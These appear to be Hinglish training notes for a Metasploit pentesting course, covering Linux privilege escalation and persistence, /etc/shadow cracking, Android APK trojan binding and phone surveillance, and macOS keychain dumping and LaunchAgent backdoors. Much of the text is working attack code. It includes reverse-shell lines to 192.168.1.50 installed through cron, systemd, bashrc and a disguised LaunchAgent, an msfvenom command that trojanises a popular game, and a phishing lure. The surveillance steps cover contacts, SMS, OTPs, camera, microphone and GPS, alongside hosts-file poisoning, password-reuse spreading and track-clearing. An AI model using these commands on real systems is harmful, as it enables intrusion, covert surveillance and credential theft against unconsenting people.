C:\> echo 192.168.1.50 www.google.com >> C:\Windows\System32\drivers\etc\hosts

# Victim google.com kholega → Aapki site khulegi!
```

---

## 🎁 **ALL MODULES COMPLETE!**

```
┌─────────────────────────────────────────────────────────┐
│  🎉 CONGRATULATIONS! 58/58 Topics Complete! 🎉          │
│                                                          │
│  ✅ Module 1: Metasploit Basics                         │
│  ✅ Module 2: Payloads & msfvenom                       │
│  ✅ Module 3: Recon & Scanning                          │
│  ✅ Module 4: Gaining Access                            │
│  ✅ Module 5: Meterpreter Basics                        │
│  ✅ Module 6: Windows Post-Exploitation (System)        │
│  ✅ Module 7: Credential Theft                          │
│  ✅ Module 8: Stealth & Persistence                     │
│  ✅ Module 9: Data Gathering                            │
│  ✅ Module 10: Pivoting & Lateral Movement              │
│  ✅ Module 11: Active Directory                         │
│  ✅ Module 12: Linux Hacking                            │
│  ✅ Module 13: Android Hacking                          │
│  ✅ Module 14: macOS Hacking                            │
│  ✅ Module 15: Automation & Defense                     │
│                                                          │
│  🏆 You are now a Metasploit Expert! 🏆                 │
│                                                          │
│  Pro Pentesting Workflow:                               │
│  1. Recon (db_nmap, auxiliary scanners)                 │
│  2. Vulnerability scan (check exploits)                 │
│  3. Exploitation (server/client-side)                   │
│  4. Post-exploitation (meterpreter)                     │
│  5. Privilege escalation (getsystem)                    │
│  6. Credential theft (hashdump, mimikatz)               │
│  7. Persistence (registry, service)                     │
│  8. Pivoting (autoroute, psexec)                        │
│  9. Lateral movement (network spread)                   │
│  10. Clean tracks (clearev, timestomp)                  │
│                                                          │
│  Remember: With great power comes great responsibility! │
│  Use ethically, legally, with permission only! ⚖️       │
└─────────────────────────────────────────────────────────┘
```

---

## 📚 **Quick Reference Cheat Sheet**

### **Essential Commands:**
```bash
# Basics
msfconsole -q
search [keyword]
use [module]
show options
set [OPTION] [value]
exploit

# Meterpreter
sysinfo, getuid, getsystem
ps, migrate [PID]
hashdump, load mimikatz
download, upload
screenshot, screenshare
shell

# Pivoting
run autoroute -s [subnet]
portfwd add -l [local] -p [remote] -r [host]
use auxiliary/server/socks_proxy

# Persistence
use exploit/windows/local/persistence
clearev, timestomp
```

### **Pro Tips:**
- 🎯 Always `check` before `exploit`
- 🔍 `getsystem` → `migrate lsass` → `hashdump`
- 💾 `setg LHOST` for efficiency
- ⚡ `exploit -z` for background sessions
- 🚀 Document everything for reports!

---

**🎓 Course Complete! Happy Ethical Hacking! 🎓**

=============================================================

# 🐧 Module 12: Hacking Other OS (Linux)

**Metasploit: Zero-to-Pentester Notes (Aapke Topics)**

---

## Topic 46: Linux Post-Recon (SUID, `sudo -l`, `LinEnum.sh`)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Linux Post-Recon - Privilege Escalation Dhundhna**  
SUID binaries aur sudo misconfigurations se root bano! 🔓

### 2. **Ye Kya Hai? (What is it?)**
Linux post-exploitation mein privilege escalation vectors dhundhte hain - SUID binaries (root permissions waale programs), sudo misconfigurations, aur automated enumeration scripts (LinEnum.sh). Yeh ek treasure hunt hai - root access ka raasta dhundhna!

### 3. **Kyun Zaroori Hai?**
- ✅ Privilege escalation
- ✅ Root access
- ✅ Complete system control
- ✅ Persistence possibilities

### 4. **Ise Kab Use Karna Chahiye?**
- Low-privilege user access hai
- Root access chahiye
- Privilege escalation vectors dhundhne hain
- Complete system compromise

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Limited user access only
- Root privileges nahi milenge
- Incomplete system compromise
- Persistence nahi kar paayenge

### 6. **Syntax aur Common Options**
```bash
# SUID binaries
find / -perm -4000 2>/dev/null
find / -perm -u=s -type f 2>/dev/null

# Sudo privileges
sudo -l

# LinEnum script
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
chmod +x LinEnum.sh
./LinEnum.sh

# GTFOBins (exploit SUID)
# Website: https://gtfobins.github.io/
```

### 7. **Example 1 (Basic)** 💡
```bash
# SUID binaries check
meterpreter > shell
$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/find      # Exploitable!
/usr/bin/nmap      # Exploitable!
/usr/bin/vim       # Exploitable!

# Sudo check
$ sudo -l
User may run the following commands:
    (root) NOPASSWD: /usr/bin/vim

# Vim exploit (GTFOBins)
$ sudo vim -c ':!/bin/sh'
# Root shell! 🎉
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete Linux privilege escalation
# Step 1: Initial access (low-privilege user)
meterpreter > getuid
Server username: www-data

# Step 2: LinEnum automated scan
meterpreter > upload /root/LinEnum.sh /tmp/
meterpreter > shell
$ chmod +x /tmp/LinEnum.sh
$ /tmp/LinEnum.sh

[+] SUID files:
    /usr/bin/find (root)
    /usr/bin/nmap (root)
    
[+] Sudo entries:
    (root) NOPASSWD: /usr/bin/python

[+] Writable /etc/passwd: NO
[+] Cron jobs: /etc/crontab (readable)

# Step 3: Exploit sudo python
$ sudo python -c 'import os; os.system("/bin/bash")'
# Root shell!

# Step 4: Verify
# whoami
root

# Step 5: Read /etc/shadow
# cat /etc/shadow
root:$6$xyz...:18000:0:99999:7:::
user:$6$abc...:18000:0:99999:7:::

# Alternative: SUID find exploit
$ find . -exec /bin/sh -p \; -quit
# Root shell!

# Alternative: SUID nmap exploit (old versions)
$ nmap --interactive
nmap> !sh
# Root shell!

# Analysis:
# LinEnum = Automated recon
# SUID binaries = Common vectors
# Sudo misconfig = Easy root
# GTFOBins = Exploit database
# Root access = Complete control!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- SUID binaries ignore karna
- `sudo -l` check nahi karna
- GTFOBins website nahi dekhna
- LinEnum output save nahi karna

### 10. **Best Practices / Pro Tips** 💎
- Hamesha `sudo -l` pehle check karo
- SUID binaries list banao
- GTFOBins bookmark karo
- LinEnum output file mein save karo

### 11. **Asli Duniya ka Scenario** 🌍
Web server compromise kiya (www-data user). LinEnum se pata chala `/usr/bin/vim` SUID hai aur sudo bina password. `sudo vim` se root shell mila. 5 minutes mein privilege escalation! Linux recon = Root ka raasta! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] SUID binaries dhundh sakte hain
- [ ] `sudo -l` check kar sakte hain
- [ ] LinEnum script chala sakte hain
- [ ] GTFOBins se exploits dhundh sakte hain

### 13. **FAQs** ❓
**Q: SUID kya hai?**  
A: Set User ID - program owner ke permissions se chalta hai (agar root owner hai toh root permissions!)

**Q: GTFOBins kya hai?**  
A: Unix binaries ka exploit database. SUID/sudo bypass methods.

### 14. **Practice Task** 📝
1. Linux VM mein low-privilege user
2. SUID binaries dhundho
3. `sudo -l` check karo
4. LinEnum chalaao
5. GTFOBins se exploit try karo

### 15. **Aakhri Summary** 📌
- 🎯 SUID binaries = Privilege escalation
- 🔍 `sudo -l` = Misconfigurations
- 💾 LinEnum = Automated recon
- ⚡ GTFOBins = Exploit database
- 🚀 Root access = Complete control!

---

## Topic 47: Linux Persistence (Cron Jobs, SSH Keys)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Linux Persistence - Hamesha Wapas Aao**  
Cron jobs aur SSH keys se permanent backdoor! 🔄

### 2. **Ye Kya Hai? (What is it?)**
Linux persistence techniques system restart ke baad bhi access maintain karti hain. **Cron jobs** scheduled tasks hain jo automatically run hote hain. **SSH keys** password-less authentication dete hain. Yeh permanent backdoors hain!

### 3. **Kyun Zaroori Hai?**
- ✅ System restart ke baad access
- ✅ Password-less login
- ✅ Automated backdoor
- ✅ Long-term access

### 4. **Ise Kab Use Karna Chahiye?**
- Root access mil gaya
- Long-term access chahiye
- System restart ho sakta hai
- Stealth persistence

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- System restart = Access lost
- Re-exploitation zaroori
- Time waste
- Unprofessional

### 6. **Syntax aur Common Options**
```bash
# Cron jobs
crontab -e                    # Edit cron
crontab -l                    # List cron
*/5 * * * * /tmp/backdoor.sh  # Every 5 minutes

# SSH keys
ssh-keygen -t rsa             # Generate key
cat ~/.ssh/id_rsa.pub         # Public key
echo "ssh-rsa AAA..." >> ~/.ssh/authorized_keys

# Bashrc persistence
echo "/tmp/backdoor.sh &" >> ~/.bashrc
```

### 7. **Example 1 (Basic)** 💡
```bash
# Cron job backdoor
meterpreter > shell
# crontab -e
# Add:
*/10 * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.50/4444 0>&1'

# SSH key persistence
# ssh-keygen -t rsa -f /root/.ssh/id_rsa -N ""
# cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
# chmod 600 /root/.ssh/authorized_keys

# Kali se login (password-less)
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa root@192.168.1.105
# Root access without password!
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete Linux persistence
# Step 1: Root access verify
meterpreter > shell
# whoami
root

# Step 2: Cron job backdoor
# cat > /tmp/backdoor.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
EOF

# chmod +x /tmp/backdoor.sh
# crontab -e
# Add:
*/5 * * * * /tmp/backdoor.sh

# Step 3: SSH key persistence
# mkdir -p /root/.ssh
# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC..." >> /root/.ssh/authorized_keys
# chmod 700 /root/.ssh
# chmod 600 /root/.ssh/authorized_keys

# Step 4: Bashrc persistence (backup)
# echo "nohup /tmp/backdoor.sh &" >> /root/.bashrc

# Step 5: System service persistence (advanced)
# cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Update Service

[Service]
ExecStart=/tmp/backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# systemctl enable backdoor.service
# systemctl start backdoor.service

# Step 6: Test (reboot VM)
# reboot

# Listener (Kali)
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444
# After reboot - connection received!

# SSH test
┌──(kali㉿kali)-[~]
└─$ ssh -i id_rsa root@192.168.1.105
# Password-less root access!

# Analysis:
# Multiple persistence methods = Redundancy
# Cron job = Automated reconnection
# SSH key = Password-less access
# Systemd service = System-level persistence
# Bashrc = User login trigger
# Complete persistence = Guaranteed access!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Cron syntax galat
- SSH key permissions galat (600 zaroori)
- Single persistence method (redundancy nahi)
- Backdoor script delete ho gayi

### 10. **Best Practices / Pro Tips** 💎
- Multiple persistence methods use karo
- SSH keys best hai (stealth + reliable)
- Cron job timing realistic rakho (*/5 suspicious)
- Backdoor script hidden location mein (`/var/tmp/.hidden`)

### 11. **Asli Duniya ka Scenario** 🌍
Linux server compromise kiya. SSH key add kiya, cron job setup kiya, systemd service banaya. 3 months baad bhi access tha - admin ne passwords change kiye par SSH key valid tha! Multiple persistence = Guaranteed access! 🔐

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] Cron jobs setup kar sakte hain
- [ ] SSH keys add kar sakte hain
- [ ] Bashrc persistence kar sakte hain
- [ ] Multiple methods use kar sakte hain

### 13. **FAQs** ❓
**Q: Cron job detect ho jayega?**  
A: Haan, `/var/log/cron` mein logs. Stealth ke liye SSH key better.

**Q: SSH key kaise copy karein?**  
A: Kali mein generate karo, public key victim par add karo, private key apne paas rakho.

### 14. **Practice Task** 📝
1. Root access lo
2. SSH key pair generate karo
3. Public key authorized_keys mein add karo
4. Cron job setup karo
5. System reboot karke test karo

### 15. **Aakhri Summary** 📌
- 🎯 Cron jobs = Automated backdoor
- 🔍 SSH keys = Password-less access
- 💾 Multiple methods = Redundancy
- ⚡ System restart = Access maintained
- 🚀 Long-term persistence!

---

## Topic 48: Reading `/etc/shadow`

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Reading /etc/shadow - Password Hashes**  
Linux password hashes nikalo aur crack karo! 🔓

### 2. **Ye Kya Hai? (What is it?)**
`/etc/shadow` file mein Linux system ke saare users ke password hashes stored hote hain. Root access se yeh file read kar sakte hain aur hashes John the Ripper se crack kar sakte hain!

### 3. **Kyun Zaroori Hai?**
- ✅ User passwords
- ✅ Lateral movement
- ✅ Credential harvesting
- ✅ Password reuse exploitation

### 4. **Ise Kab Use Karna Chahiye?**
- Root access mil gaya
- User passwords chahiye
- Lateral movement planning
- Credential database banana hai

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- User passwords miss
- Lateral movement limited
- Password reuse exploit nahi
- Incomplete credential harvest

### 6. **Syntax aur Common Options**
```bash
# Read shadow file
cat /etc/shadow

# Copy to Kali
meterpreter > download /etc/shadow /root/shadow.txt

# John the Ripper
john shadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
john --show shadow.txt

# Hashcat
hashcat -m 1800 shadow.txt rockyou.txt
```

### 7. **Example 1 (Basic)** 💡
```bash
# Read shadow file
meterpreter > shell
# cat /etc/shadow
root:$6$xyz123...:18000:0:99999:7:::
user:$6$abc456...:18000:0:99999:7:::
admin:$6$def789...:18000:0:99999:7:::

# Download
meterpreter > download /etc/shadow /root/shadow.txt

# Crack (Kali)
┌──(kali㉿kali)-[~]
└─$ john shadow.txt --wordlist=/usr/share/wordlists/rockyou.txt
user:password123
admin:Welcome2024
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete shadow cracking workflow
# Step 1: Root access verify
meterpreter > shell
# whoami
root

# Step 2: Read shadow
# cat /etc/shadow
root:$6$rounds=5000$xyz...:18000:0:99999:7:::
john:$6$rounds=5000$abc...:18000:0:99999:7:::
admin:$6$rounds=5000$def...:18000:0:99999:7:::
backup:$6$rounds=5000$ghi...:18000:0:99999:7:::

# Step 3: Download both files
meterpreter > download /etc/passwd /root/passwd.txt
meterpreter > download /etc/shadow /root/shadow.txt

# Step 4: Unshadow (combine)
┌──(kali㉿kali)-[~]
└─$ unshadow passwd.txt shadow.txt > combined.txt

# Step 5: John the Ripper
┌──(kali㉿kali)-[~]
└─$ john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt
john:Password123
admin:Admin@2024
backup:Backup123

# Step 6: Show cracked
┌──(kali㉿kali)-[~]
└─$ john --show combined.txt
john:Password123:1001:1001::/home/john:/bin/bash
admin:Admin@2024:1002:1002::/home/admin:/bin/bash
backup:Backup123:1003:1003::/home/backup:/bin/bash

3 password hashes cracked

# Step 7: Use credentials (SSH)
┌──(kali㉿kali)-[~]
└─$ ssh john@192.168.1.105
Password: Password123
john@victim:~$

# Step 8: Password reuse check (other systems)
┌──(kali㉿kali)-[~]
└─$ ssh john@192.168.1.106
Password: Password123
# Works! Password reuse!

# Analysis:
# /etc/shadow = Password hashes
# unshadow = Combine passwd + shadow
# John = Crack hashes
# Weak passwords = Common
# Password reuse = Multiple systems
# Credential harvesting = Complete!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Root access nahi hai
- unshadow skip karna (passwd + shadow combine)
- Weak wordlist
- Cracked passwords note nahi karna

### 10. **Best Practices / Pro Tips** 💎
- `unshadow` use karo (better results)
- Large wordlist (rockyou.txt minimum)
- Cracked passwords database mein save karo
- Password reuse check karo (other systems)

### 11. **Asli Duniya ka Scenario** 🌍
Linux server se shadow file nikali. 20 users the. John se 8 passwords crack ho gaye (weak passwords!). Password reuse se 5 aur servers compromise. Ek shadow file se network spread! Password reuse = Hacker's best friend! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] `/etc/shadow` read kar sakte hain
- [ ] `unshadow` use kar sakte hain
- [ ] John the Ripper se crack kar sakte hain
- [ ] Password reuse check kar sakte hain

### 13. **FAQs** ❓
**Q: Shadow file bina root ke read ho sakti hai?**  
A: Nahi, root permissions zaroori hain.

**Q: Hash format kya hai?**  
A: `$6$` = SHA-512, `$5$` = SHA-256, `$1$` = MD5

### 14. **Practice Task** 📝
1. Root access lo
2. `/etc/shadow` read karo
3. passwd aur shadow download karo
4. unshadow chalaao
5. John se crack karo

### 15. **Aakhri Summary** 📌
- 🎯 `/etc/shadow` = Password hashes
- 🔍 unshadow = Combine files
- 💾 John the Ripper = Cracking
- ⚡ Weak passwords = Common
- 🚀 Password reuse = Network spread!

---

## 🎁 **Module 12 Complete!**

```
┌─────────────────────────────────────────────────────────┐
│  Module 12: Linux Hacking Master! 🐧                    │
│                                                          │
│  ✅ Post-Recon = SUID, sudo, LinEnum                    │
│  ✅ Persistence = Cron jobs, SSH keys                   │
│  ✅ /etc/shadow = Password hashes                       │
│                                                          │
│  Pro Linux Attack Chain:                                │
│  1. Initial access (low-privilege)                      │
│  2. LinEnum (automated recon)                           │
│  3. SUID/sudo exploit (privilege escalation)            │
│  4. Root access (complete control)                      │
│  5. /etc/shadow (password hashes)                       │
│  6. Persistence (cron + SSH keys)                       │
│  7. Long-term access = Maintained! 🔐                   │
│                                                          │
│  Next: Module 13 - Android Hacking! 📱                  │
└─────────────────────────────────────────────────────────┘
```

**Module 12 Complete! Ready for Module 13?** 🚀

=============================================================

# 📱 Module 13: Hacking Other OS (Android)

**Metasploit: Zero-to-Pentester Notes (Aapke Topics)**

---

## Topic 49: Binding with Legitimate APK

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**APK Binding - Legitimate App Mein Payload Chhupao**  
Asli game/app ke andar backdoor inject karo! 🎮

### 2. **Ye Kya Hai? (What is it?)**
APK binding mein aap ek legitimate Android app (jaise game, utility) ke andar apna meterpreter payload inject karte hain. User ko legitimate app dikhta hai, par background mein aapka backdoor chalta hai. Yeh ek Trojan horse hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Social engineering easy
- ✅ User trust
- ✅ App functional rahta hai
- ✅ Detection kam

### 4. **Ise Kab Use Karna Chahiye?**
- Social engineering attack
- Targeted individual
- Legitimate app available hai
- User trust chahiye

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Simple APK suspicious lagega
- User install nahi karega
- Social engineering fail
- Detection zyada

### 6. **Syntax aur Common Options**
```bash
# Simple APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -o malicious.apk

# Bind with legitimate APK
msfvenom -x legitimate_app.apk -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -o bound.apk

# Manual binding (advanced)
# Tools: APK Injector, FatRat, Backdoor-apk
```

### 7. **Example 1 (Basic)** 💡
```bash
# Simple Android payload
┌──(kali㉿kali)-[~]
└─$ msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o simple.apk
[*] Creating APK...
[*] APK saved: simple.apk

# Listener
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD android/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 4444
msf6 > exploit -j

# Victim installs simple.apk
[*] Meterpreter session 1 opened
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete APK binding workflow
# Step 1: Download legitimate APK
┌──(kali㉿kali)-[~]
└─$ wget https://example.com/popular_game.apk

# Step 2: Bind payload
┌──(kali㉿kali)-[~]
└─$ msfvenom -x popular_game.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=443 -o game_modded.apk
[*] Injecting payload into popular_game.apk
[*] Signing APK...
[*] APK saved: game_modded.apk

# Step 3: Listener setup
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD android/meterpreter/reverse_tcp
msf6 > set LHOST 192.168.1.50
msf6 > set LPORT 443
msf6 > set ExitOnSession false
msf6 > exploit -j

# Step 4: Social engineering
# Email/WhatsApp: "Check out this modded game with unlimited coins!"
# Attachment: game_modded.apk

# Step 5: Victim installs
# Game works normally (legitimate app functional)
# Background: Meterpreter connects

[*] Sending stage (200774 bytes)
[*] Meterpreter session 1 opened

meterpreter > sysinfo
Computer    : Samsung Galaxy S10
OS          : Android 11
Architecture: arm64
Meterpreter : dalvik/android

# Analysis:
# Legitimate app = User trust
# Game functional = No suspicion
# Background payload = Stealth
# Port 443 = Firewall bypass
# Social engineering = Successful!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Legitimate APK source unreliable
- Binding fail (compatibility issues)
- APK sign nahi karna
- Suspicious app name

### 10. **Best Practices / Pro Tips** 💎
- Popular apps use karo (games, utilities)
- APK sign karo (msfvenom auto-signs)
- Port 443/80 use karo
- Social engineering context strong rakho

### 11. **Asli Duniya ka Scenario** 🌍
Popular game "Candy Crush" mein payload bind kiya. "Unlimited Lives Mod" naam se bheja. 10 employees ne install kiya (company phones!). 10 Android devices compromise. Legitimate app + social engineering = Powerful combo! 🎯

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] Simple APK bana sakte hain
- [ ] Legitimate APK mein bind kar sakte hain
- [ ] Listener setup kar sakte hain
- [ ] Social engineering context samajh aaya

### 13. **FAQs** ❓
**Q: Binding hamesha kaam karti hai?**  
A: Nahi, kuch APKs compatible nahi hote. Test karo pehle.

**Q: Google Play Protect detect karega?**  
A: Haan, possible hai. "Unknown sources" se install karna padega.

### 14. **Practice Task** 📝
1. Simple APK banao
2. Test Android device/emulator par install karo
3. Listener setup karo
4. Meterpreter session verify karo
5. Legitimate APK binding try karo

### 15. **Aakhri Summary** 📌
- 🎯 APK binding = Trojan horse
- 🔍 Legitimate app = User trust
- 💾 Social engineering = Key
- ⚡ Functional app = No suspicion
- 🚀 Mobile hacking ka powerful method!

---

## Topic 50: Android Meterpreter (dump_contacts, dump_sms, webcam_stream, geolocate)

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Android Meterpreter - Mobile Ka Poora Control**  
Contacts, SMS, Camera, Location - sab access karo! 📲

### 2. **Ye Kya Hai? (What is it?)**
Android Meterpreter session mein mobile-specific commands hote hain jo contacts, SMS, call logs, camera, GPS location, aur bahut kuchh access karte hain. Yeh ek mobile surveillance tool hai!

### 3. **Kyun Zaroori Hai?**
- ✅ Personal data access
- ✅ Real-time surveillance
- ✅ Location tracking
- ✅ Complete mobile compromise

### 4. **Ise Kab Use Karna Chahiye?**
- Android meterpreter session hai
- Personal data chahiye
- Location tracking
- Surveillance operation

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga?** 😟
- Limited mobile access
- Personal data miss
- Location tracking nahi
- Incomplete mobile compromise

### 6. **Syntax aur Common Options**
```bash
# Contacts
dump_contacts

# SMS
dump_sms

# Call logs
dump_calllog

# Camera
webcam_list
webcam_snap
webcam_stream

# Location
geolocate

# Microphone
record_mic -d [seconds]

# Send SMS
send_sms -d "+1234567890" -t "Message"

# Device info
check_root
sysinfo
```

### 7. **Example 1 (Basic)** 💡
```bash
# Android Meterpreter session
meterpreter > sysinfo
Computer    : Samsung Galaxy
OS          : Android 11
Architecture: arm64

# Dump contacts
meterpreter > dump_contacts
[*] Fetching contacts...
[+] Contact: John Doe - +1234567890
[+] Contact: Jane Smith - +0987654321
[+] Contact: Boss - +1111111111
[*] Contacts saved to: /root/.msf4/loot/contacts.txt

# Dump SMS
meterpreter > dump_sms
[*] Fetching SMS...
[+] From: +1234567890
    Message: "Meeting at 5 PM"
    Date: 2024-01-15 14:30
[*] SMS saved to: /root/.msf4/loot/sms.txt

# Location
meterpreter > geolocate
[*] Current location:
    Latitude: 37.7749
    Longitude: -122.4194
    Accuracy: 10 meters
```

### 8. **Example 2 (Pentester-Focused)** 🎯
```bash
# Complete Android surveillance
# Step 1: Session info
meterpreter > sysinfo
Computer    : OnePlus 9
OS          : Android 12
Meterpreter : dalvik/android

# Step 2: Root check
meterpreter > check_root
[+] Device is rooted!

# Step 3: Contacts dump
meterpreter > dump_contacts
[*] Fetching 150 contacts...
[+] Saved to: /root/.msf4/loot/victim_contacts.txt

# Step 4: SMS dump
meterpreter > dump_sms
[*] Fetching 500 messages...
[+] Banking OTP found: "Your OTP is 123456"
[+] Saved to: /root/.msf4/loot/victim_sms.txt

# Step 5: Call logs
meterpreter > dump_calllog
[*] Fetching call history...
[+] Outgoing: +1234567890 (5 min) - 2024-01-15 10:00
[+] Incoming: +0987654321 (2 min) - 2024-01-15 09:30

# Step 6: Camera access
meterpreter > webcam_list
1: Back Camera
2: Front Camera

meterpreter > webcam_snap -i 2
[*] Taking snapshot from Front Camera...
[+] Image saved: /root/.msf4/loot/webcam_001.jpg

meterpreter > webcam_stream -i 2
[*] Starting video stream...
[*] Stream URL: http://127.0.0.1:8080
# Browser mein kholo - live camera!

# Step 7: Location tracking
meterpreter > geolocate
[*] GPS Location:
    Latitude: 40.7128
    Longitude: -74.0060
    Address: New York, NY
    Accuracy: 5 meters

# Step 8: Microphone recording
meterpreter > record_mic -d 30
[*] Recording for 30 seconds...
[+] Audio saved: /root/.msf4/loot/audio_001.mp3

# Step 9: Send SMS (phishing)
meterpreter > send_sms -d "+1234567890" -t "Your bank account has been locked. Click: http://phishing.com"
[*] SMS sent successfully

# Step 10: File system access
meterpreter > ls /sdcard/DCIM/Camera
[*] Photos:
    IMG_001.jpg
    IMG_002.jpg
    VID_001.mp4

meterpreter > download /sdcard/DCIM/Camera /root/victim_photos/
[*] Downloading photos...

# Analysis:
# Contacts = 150 people
# SMS = Banking OTPs, personal messages
# Camera = Live surveillance
# Location = Real-time tracking
# Microphone = Audio recording
# Complete mobile = Compromised!
```

### 9. **Beginners ki Aam Galtiyan** ⚠️
- Permissions nahi hain (app ko grant karna padta hai)
- Root check nahi karna
- Loot files location bhool jaana
- Webcam stream URL miss karna

### 10. **Best Practices / Pro Tips** 💎
- `check_root` pehle chalaao
- Loot files organize karo (contacts, sms, photos)
- Webcam stream browser mein kholo
- Location periodic check karo (tracking)

### 11. **Asli Duniya ka Scenario** 🌍
Employee ka phone compromise kiya. Contacts se company directory mili. SMS se banking OTPs. Camera se office layout. Location se daily routine. Microphone se confidential meetings. Ek phone se complete intelligence! Mobile = Data goldmine! 📊

### 12. **Checklist / Chota Recap (TL;DR)** ✅
- [ ] Contacts dump kar sakte hain
- [ ] SMS read kar sakte hain
- [ ] Camera access kar sakte hain
- [ ] Location track kar sakte hain
- [ ] Microphone record kar sakte hain

### 13. **FAQs** ❓
**Q: Permissions kaise milenge?**  
A: App install karte waqt user ko grant karne padte hain. Social engineering se convince karo.

**Q: Root zaroori hai?**  
A: Nahi, par root se zyada access milta hai.

### 14. **Practice Task** 📝
1. Android emulator setup karo
2. APK install karo
3. Meterpreter session lo
4. dump_contacts chalaao
5. webcam_snap try karo
6. geolocate test karo

### 15. **Aakhri Summary** 📌
- 🎯 Android Meterpreter = Complete mobile control
- 🔍 Contacts/SMS = Personal data
- 💾 Camera/Mic = Surveillance
- ⚡ Location = Real-time tracking
- 🚀 Mobile hacking ka ultimate tool!

---

## 🎁 **Module 13 Complete!**

```
┌─────────────────────────────────────────────────────────┐
│  Module 13: Android Hacking Master! 📱                  │
│                                                          │
│  ✅ APK Binding = Trojan horse                          │
│  ✅ Android Meterpreter = Complete control              │
│                                                          │
│  Pro Android Attack Chain:                              │
│  1. Legitimate APK mein payload bind                    │
│  2. Social engineering (modded app)                     │
│  3. User installs (permissions grant)                   │
│  4. Meterpreter session (background)                    │
│  5. dump_contacts, dump_sms (data)                      │
│  6. webcam_stream (surveillance)                        │
│  7. geolocate (tracking)                                │
│  8. Complete mobile = Compromised! 📲                   │
│                                                          │
│  Remember: Mobile = Personal data goldmine!             │
│                                                          │
│  Next: Module 14 - macOS Hacking! 🍎                   │
└─────────────────────────────────────────────────────────┘
```

**Module 13 Complete! Ready for Module 14?** 🚀


=============================================================

# 🍎⚙️ Module 14-15: macOS Hacking & Framework Automation

**Metasploit: Zero-to-Pentester Notes (Aapke Topics)**

---

## 🍎 MODULE 14: Hacking Other OS (macOS)

### Topic 51: macOS Post-Exploitation (`keychain_dump`)

**macOS Keychain - Password Vault Ka Khazana** 🔐

#### **Kya Hai Keychain?**
macOS Keychain ek password manager hai jo Wi-Fi passwords, website logins, certificates sab store karta hai. Yeh ek digital vault hai!

#### **Syntax:**
```bash
use post/osx/gather/keychain_dump
set SESSION [session_id]
run
```

#### **Example:**
```bash
meterpreter > background
msf6 > use post/osx/gather/keychain_dump
msf6 > set SESSION 1
msf6 > run

[*] Dumping Keychain...
[+] Service: iCloud
    Account: user@apple.com
    Password: ApplePass123

[+] Service: WiFi (Home Network)
    Password: HomeWiFi2024

[+] Service: company-vpn.com
    Account: admin
    Password: VPNPass@123

[*] Keychain dump saved: /root/.msf4/loot/keychain.txt
```

#### **Real Scenario:**
macOS laptop compromise kiya. Keychain dump se 50+ passwords mile - email, VPN, Wi-Fi, banking sab! Keychain = Password goldmine! 🎯

---

### Topic 52: macOS Persistence (LaunchAgents, LaunchDaemons)

**macOS Persistence - Hamesha Wapas Aao** 🔄

#### **LaunchAgents vs LaunchDaemons:**
- **LaunchAgents:** User-level (user login par run)
- **LaunchDaemons:** System-level (boot par run, root needed)

#### **Syntax:**
```bash
# LaunchAgent (user-level)
meterpreter > shell
$ cat > ~/Library/LaunchAgents/com.apple.update.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.update</string>
    <key>ProgramArguments</key>
    <array>
        <string>/tmp/backdoor.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF

$ launchctl load ~/Library/LaunchAgents/com.apple.update.plist

# LaunchDaemon (system-level, root needed)
# sudo cp backdoor.plist /Library/LaunchDaemons/
# sudo launchctl load /Library/LaunchDaemons/backdoor.plist
```

#### **Example:**
```bash
# Complete macOS persistence
meterpreter > shell
$ whoami
victim

# Backdoor script
$ cat > /tmp/backdoor.sh << EOF
#!/bin/bash
while true; do
    bash -i >& /dev/tcp/192.168.1.50/4444 0>&1
    sleep 300
done
EOF

